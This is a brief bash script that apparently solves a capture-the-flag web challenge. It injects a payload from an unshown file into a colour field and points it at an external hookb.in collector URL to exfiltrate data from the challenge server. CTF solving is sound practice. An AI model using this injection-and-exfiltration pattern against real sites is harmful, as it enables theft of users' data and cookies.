#! /usr/bin/env bash

curl --data-urlencode "bg=white" --data-urlencode "fg=black" --data-urlencode "bbg=black" --data-urlencode "bfg=$(cat solution.txt | sed 's;YOUR_URL_HERE;https://hookb.in/XkM7qXxEQDuGBBm38r6o;g')" -X POST http://webp.bcactf.com:49153/submit
